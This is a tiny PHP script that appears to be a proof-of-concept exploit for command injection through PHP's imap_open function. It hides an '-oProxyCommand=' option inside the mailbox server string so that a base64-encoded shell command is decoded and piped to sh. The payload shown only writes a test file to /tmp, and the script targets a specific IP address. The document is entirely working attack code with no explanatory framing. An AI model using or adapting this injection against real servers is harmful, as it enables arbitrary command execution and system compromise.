<?php
# CRLF (c)
# echo '1234567890'>/tmp/test0001

$server = "x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}";

imap_open('{'.$server.'180.233.156.53:80/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
